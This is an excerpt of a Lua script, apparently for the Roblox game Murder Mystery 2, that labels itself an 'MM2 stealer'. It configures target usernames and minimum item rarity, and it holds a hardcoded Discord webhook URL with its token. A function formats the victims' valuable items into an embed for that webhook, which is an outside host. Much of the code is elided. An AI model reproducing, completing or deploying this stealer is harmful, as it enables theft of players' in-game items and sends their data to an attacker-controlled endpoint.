...
local users = _G.Usernames or {"herocoi99", "user2", "user3"}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or "https://discord.com/api/webhooks/1355852705234681927/WDjzOskbpI06EHdcSBAS9y0jBbR23b2k3eDStdE1tQ-_iIk9Pp2k5BKliFP9U6k55pnt"
...
local function SendMessage(sortedItems)
    ...
    local data = {
        ["embeds"] = {{
			...
			["fields"] = fields,
			["footer"] = {
				["text"] = "MM2 stealer by Syn. discord.gg/"
			}
        }}
    }
